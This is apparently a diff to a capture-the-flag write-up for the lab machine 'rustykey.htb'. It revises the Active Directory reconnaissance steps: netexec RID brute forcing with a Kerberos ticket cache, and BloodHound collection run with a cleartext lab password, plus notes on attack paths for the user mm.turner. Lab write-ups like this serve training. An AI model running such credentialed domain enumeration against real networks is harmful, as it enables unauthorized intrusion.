@@ -209,15 +209,6 @@ LDAP        dc.rustykey.htb 389    DC               backupadmin                 
 Get RIDs:
 
 ```console
-
-```
-
-
-netexec smb dc.rustykey.htb -d rustykey.htb -u rr.parker -k --use-kcache --shares
-
-netexec ldap dc.rustykey.htb -d rustykey.htb -u rr.parker -k --use-kcache --users
-
-```console
 root@kali:~# netexec smb dc.rustykey.htb -d rustykey.htb -u rr.parker -k --use-kcache --rid-brute
 SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
 SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker from ccache
@@ -281,8 +272,8 @@ SMB         dc.rustykey.htb 445    dc               3601: RUSTYKEY\backupadmin (
 Generating bloodhound packages
 
 ```console
-root@kali:~# bloodhound-python -d rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -ns 10.10.11.75 -c all --dns-tcp --zip
-INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+root@kali:~# bloodhound-ce-python -d rustykey.htb -u rr.parker -p '8#t5HE8L!W3A' -ns 10.10.11.75 -c all --dns-tcp --zip
+INFO: BloodHound.py for BloodHound Community Edition
 INFO: Found AD domain: rustykey.htb
 INFO: Getting TGT for user
 INFO: Connecting to LDAP server: dc.rustykey.htb
@@ -314,8 +305,21 @@ INFO: Querying computer:
 INFO: Querying computer:
 INFO: Querying computer: dc.rustykey.htb
 INFO: Done in 00M 01S
-INFO: Compressing output into 20250907152849_bloodhound.zip
+INFO: Compressing output into 20250907230146_bloodhound.zip
 ```
+
+This `rr.parker` user isn't really useful:
+
+![](https://github.com/user-attachments/assets/413664ef-49fc-49be-a79f-8a7658eca17b)
+
+But the `mm.turner` user comes up in some shortest path searches:
+
+![](https://github.com/user-attachments/assets/55e61f44-d1c8-49e4-8e21-d3367e2ad312)
+
+![](https://github.com/user-attachments/assets/8892f586-1e8d-4591-b728-b5d31c9e864e)
+
+![](https://github.com/user-attachments/assets/992d3a1d-bf6b-47ad-a265-588cfdeb700c)
+
 
 ```console
 
